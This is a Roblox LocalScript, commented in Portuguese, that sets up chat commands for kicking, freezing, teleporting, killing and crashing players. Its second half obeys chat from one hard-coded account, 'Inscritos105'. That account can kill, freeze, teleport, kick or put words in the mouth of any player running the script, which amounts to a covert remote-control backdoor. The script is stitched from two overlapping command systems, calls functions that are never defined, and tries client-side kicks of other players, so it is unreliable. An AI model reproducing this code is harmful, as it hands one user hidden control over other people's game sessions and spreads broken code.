-- // LocalScript (StarterPlayerScripts)

-- // Serviços
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")

-- // Configurações
local COMMAND_PREFIXES = {"?", ";", ":", "!"}
local MAX_ARGS = 20
local ADMIN_NAMES = {"inscritos105", "ins", "insc", "inscri", "inscr", "inscritos"} -- abreviações possíveis

-- // Função de enviar mensagem no chat
local function sendMessage(message)
	local chatChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
	if chatChannel then
		chatChannel:SendAsync(message)
	else
		warn("Erro ao enviar mensagem.")
	end
end

-- // Identificação do chatlogger
local function identifyCommand(message)
	for _, prefix in ipairs(COMMAND_PREFIXES) do
		if message:lower():sub(1, #prefix) == prefix then
			return true
		end
	end
	return false
end

-- // Obter jogador pelo nome ou parte dele
local function getPlayerByPartialName(partial)
	if not partial then return end
	partial = partial:lower()
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Name:lower():sub(1, #partial) == partial then
			return player
		end
	end
end

-- // Comandos principais
local function executeCommand(message)
	if not identifyCommand(message) then return end

	local args = string.split(message, " ")
	if #args == 0 then return end

	local prefix = string.sub(args[1], 1, 1)
	local command = string.sub(args[1], 2):lower()
	table.remove(args, 1)

	local targetName = args[1] and args[1]:lower()
	local phrase = table.concat(args, " ", 2)
	local targetPlayer = getPlayerByPartialName(targetName)

	-- Identifica se o alvo é o dono
	local isTargetAdmin = false
	for _, name in ipairs(ADMIN_NAMES) do
		if targetName == name then
			isTargetAdmin = true
			break
		end
	end

	-- // Comando SAY / CHAT
	if (command == "say" or command == "chat") and isTargetAdmin then
		if phrase ~= "" then
			sendMessage(phrase) -- mantém maiúsculas/minúsculas
		end

	-- // KICK
	elseif command == "kick" and targetPlayer then
		targetPlayer:Kick("Você foi expulso pelo administrador.")

	-- // FREEZE
	elseif command == "freeze" and targetPlayer then
		local character = targetPlayer.Character
		if character then
			for _, part in ipairs(character:GetDescendants()) do
				if part:IsA("BasePart") then
					part.Anchored = true
				end
			end
		end

	-- // UNFREEZE
	elseif command == "unfreeze" and targetPlayer then
		local character = targetPlayer.Character
		if character then
			for _, part in ipairs(character:GetDescendants()) do
				if part:IsA("BasePart") then
					part.Anchored = false
				end
			end
		end

	-- // BRING
	elseif command == "bring" and targetPlayer then
		local targetChar = targetPlayer.Character
		local myChar = LocalPlayer.Character
		if targetChar and myChar and myChar:FindFirstChild("HumanoidRootPart") then
			targetChar:MoveTo(myChar.HumanoidRootPart.Position + Vector3.new(2, 0, 0))
		end

	-- // CRASH (simulação)
	elseif command == "crash" and targetPlayer then
		while true do end -- simula travamento local (não recomendado em jogos públicos)
	end
end

-- // Escuta o chatlogger
TextChatService.MessageReceived:Connect(function(message)
	local text = message.Text
	local author = message.TextSource and message.TextSource.Name or ""

	-- Ignora as próprias mensagens
	if author == LocalPlayer.Name then return end

	executeCommand(text)
end)
-- // Ações
local function resetCharacter()
	if LocalPlayer.Character then
		LocalPlayer.Character:BreakJoints()
	end
end

local function bringToPlayer(targetPlayer)
	if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
	if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return end

	local targetHRP = targetPlayer.Character.HumanoidRootPart
	local offset = targetHRP.CFrame.LookVector * 5
	LocalPlayer.Character:SetPrimaryPartCFrame(targetHRP.CFrame + offset)
end

local function freezeCharacter()
	if not LocalPlayer.Character then return end
	local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if humanoid and hrp then
		frozen = true
		humanoid.WalkSpeed = 0
		humanoid.JumpPower = 0
		hrp.Anchored = true
	end
end

local function unfreezeCharacter()
	if not LocalPlayer.Character then return end
	local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if humanoid and hrp then
		frozen = false
		humanoid.WalkSpeed = 16
		humanoid.JumpPower = 50
		hrp.Anchored = false
	end
end

local function kickPlayer()
	LocalPlayer:Kick("Kicked by Ryu")
end

-- // Sistema de comandos
local function onPlayerChatted(player, message)
	if player.Name ~= "Inscritos105" then return end

	-- Mantém mensagem original para preservar maiúsculas
	local messageOriginal = message
	local messageLower = message:lower()

	-- Separa as palavras (minúsculas só para comparar nomes/comandos)
	local words = {}
	for word in messageLower:gmatch("%S+") do
		table.insert(words, word)
	end

	local myName = LocalPlayer.Name:lower()

	-- ?kill
	if isCommand(messageLower, "kill") then
		for i = 2, math.min(#words, MAX_ARGS + 1) do
			if isTargetName(words[i], myName) then
				resetCharacter()
				break
			end
		end
	end

	-- ?bring
	if isCommand(messageLower, "bring") then
		for i = 2, math.min(#words, MAX_ARGS + 1) do
			if isTargetName(words[i], myName) then
				bringToPlayer(player)
				break
			end
		end
	end

	-- ?freeze
	if isCommand(messageLower, "freeze") then
		for i = 2, math.min(#words, MAX_ARGS + 1) do
			if isTargetName(words[i], myName) then
				freezeCharacter()
				break
			end
		end
	end

	-- ?unfreeze
	if isCommand(messageLower, "unfreeze") then
		for i = 2, math.min(#words, MAX_ARGS + 1) do
			if isTargetName(words[i], myName) then
				unfreezeCharacter()
				break
			end
		end
	end

	-- ?say ou ?chat
	if isCommand(messageLower, "say") or isCommand(messageLower, "chat") then
		-- Divide novamente preservando maiúsculas
		local wordsOriginal = {}
		for word in messageOriginal:gmatch("%S+") do
			table.insert(wordsOriginal, word)
		end

		if #wordsOriginal < 3 then return end

		local targetNameLower = wordsOriginal[2]:lower()
		if isTargetName(targetNameLower, myName) then
			local startIndex = messageOriginal:find(wordsOriginal[3])
			if startIndex then
				local phrase = messageOriginal:sub(startIndex)
				sendMessage(phrase)
			end
		end
	end

	-- ?kick
	if isCommand(messageLower, "kick") then
		if #words < 2 then return end
		local targetNameLower = words[2]:lower()
		if isTargetName(targetNameLower, myName) then
			kickPlayer()
		end
	end
end

-- // Conectar eventos de chat
local function connectPlayers()
	for _, player in ipairs(Players:GetPlayers()) do
		player.Chatted:Connect(function(msg)
			onPlayerChatted(player, msg)
		end)
	end

	Players.PlayerAdded:Connect(function(player)
		player.Chatted:Connect(function(msg)
			onPlayerChatted(player, msg)
		end)
	end)
end

connectPlayers()
